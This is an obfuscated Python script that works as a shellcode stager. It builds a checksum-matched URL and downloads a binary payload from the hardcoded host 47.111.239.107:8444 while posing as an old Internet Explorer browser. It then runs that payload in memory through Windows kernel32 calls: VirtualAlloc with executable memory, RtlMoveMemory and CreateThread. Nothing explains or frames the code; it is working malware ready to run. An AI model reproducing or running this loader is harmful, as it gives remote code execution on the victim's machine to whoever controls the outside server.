import urllib.request, string, random, ctypes as oiYlWEqOOm
def vdcGhgtn(s): return sum([ord(ch) for ch in s]) % 0x100
def FHgjrfkVtAdSU():
	for x in range(64):
		dWsxmRwBGClFCC = ''.join(random.sample(string.ascii_letters + string.digits,3))
		mFzbSITP = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for FLjmjywwijLOlVQ in mFzbSITP:
			if vdcGhgtn(dWsxmRwBGClFCC + FLjmjywwijLOlVQ) == 92: return dWsxmRwBGClFCC + FLjmjywwijLOlVQ
def FufdNw(kQwQyeNsaVwDRj, wamNuwaCycQH):
	qzuILJBluatl = urllib.request.ProxyHandler({})
	oUZhmxdQHUOa = urllib.request.build_opener(qzuILJBluatl)
	urllib.request.install_opener(oUZhmxdQHUOa)
	huOlGd = urllib.request.Request("http://" + kQwQyeNsaVwDRj + ":" + str(wamNuwaCycQH) + "/" + FHgjrfkVtAdSU(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
	try:
		TYjdmvkelxTrM = urllib.request.urlopen(huOlGd)
		try:
			if int(TYjdmvkelxTrM.info()["Content-Length"]) > 100000: return TYjdmvkelxTrM.read()
			else: return ''
		except: return TYjdmvkelxTrM.read()
	except urllib.request.URLError:
		return ''
def XVRZvLxCnjjk(ZXXcZxqtNIyzhX):
	if ZXXcZxqtNIyzhX != "":
		nLhRtWupzEwbgm = bytearray(ZXXcZxqtNIyzhX)
		BeWYhezWxtq = oiYlWEqOOm.windll.kernel32.VirtualAlloc(oiYlWEqOOm.c_int(0),oiYlWEqOOm.c_int(len(nLhRtWupzEwbgm)), oiYlWEqOOm.c_int(0x3000),oiYlWEqOOm.c_int(0x40))
		qeSgXW = (oiYlWEqOOm.c_char * len(nLhRtWupzEwbgm)).from_buffer(nLhRtWupzEwbgm)
		oiYlWEqOOm.windll.kernel32.RtlMoveMemory(oiYlWEqOOm.c_int(BeWYhezWxtq),qeSgXW, oiYlWEqOOm.c_int(len(nLhRtWupzEwbgm)))
		tuTqqqWXNctXS = oiYlWEqOOm.windll.kernel32.CreateThread(oiYlWEqOOm.c_int(0),oiYlWEqOOm.c_int(0),oiYlWEqOOm.c_int(BeWYhezWxtq),oiYlWEqOOm.c_int(0),oiYlWEqOOm.c_int(0),oiYlWEqOOm.pointer(oiYlWEqOOm.c_int(0)))
		oiYlWEqOOm.windll.kernel32.WaitForSingleObject(oiYlWEqOOm.c_int(tuTqqqWXNctXS),oiYlWEqOOm.c_int(-1))
iqpqKRwuDDzF = ''
iqpqKRwuDDzF = FufdNw("47.111.239.107", 8444)
XVRZvLxCnjjk(iqpqKRwuDDzF)
